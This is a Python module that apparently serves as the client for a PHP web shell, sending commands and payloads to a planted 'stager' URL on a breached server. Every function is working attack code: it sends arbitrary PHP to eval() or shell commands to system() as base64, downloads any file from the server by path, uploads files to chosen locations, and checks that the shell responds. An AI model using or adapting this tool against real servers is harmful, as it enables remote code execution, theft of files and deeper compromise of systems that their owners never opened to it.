import requests
import base64

from . import util


def execute_command(stager_url: str, command: str, post: bool = False, param: str = 'c') -> str:
    if not command.endswith(';'):
        command += ';'

    r = requests.get(stager_url, params={param: command})
    return r.text


def execute_payload(stager_url: str, payload: str, get_param: str = 'c', post_param: str = 'd') -> str:
    r = requests.post(stager_url, params={get_param: f"eval(base64_decode($_POST['{post_param}']));"},
                      data={post_param: base64.b64encode(payload.encode())})
    return r.text


def execute_system_command(stager_url: str, command: str, get_param: str = 'c', post_param: str = 'd') -> str:
    r = requests.post(stager_url, params={get_param: f"system(base64_decode($_POST['{post_param}']));"},
                      data={post_param: base64.b64encode(command.encode())})
    return r.text


def download_file(stager_url: str, remote_path: str, local_path: str, param: str = 'c'):
    payload = '''header("Content-Description: File Transfer"); 
    header("Content-Type: application/octet-stream"); 
    header("Content-Disposition: attachment; filename=\\"". basename($_GET['file']) ."\\"");
    readfile($_GET["file"]);'''
    payload = base64.b64encode(payload.encode()).decode()

    with requests.post(stager_url, params={param: f"eval(base64_decode($_POST['p']));", 'file': remote_path},
                       data={'p': payload}, stream=True) as r:
        r.raise_for_status()
        with open(local_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)


def upload_file(stager_url: str, local_path: str, remote_path: str, param: str = 'c') -> bool:
    payload = '''
    echo move_uploaded_file($_FILES['file']['tmp_name'], $_GET['n']) ? "OK" : "FAIL";
    '''
    payload = base64.b64encode(payload.encode()).decode()

    file = open(local_path, 'rb')
    r = requests.post(stager_url, params={param: f"eval(base64_decode($_POST['p']));", 'n': remote_path}, data={'p': payload},
                  files={'file': file})

    return r.text == 'OK'

def perform_basic_tests(stager_url: str) -> bool:
    token = util.random_string(15)
    if execute_command(stager_url, f'echo "{token}"') != token:
        return False

    # Add more eventual tests further on

    return True
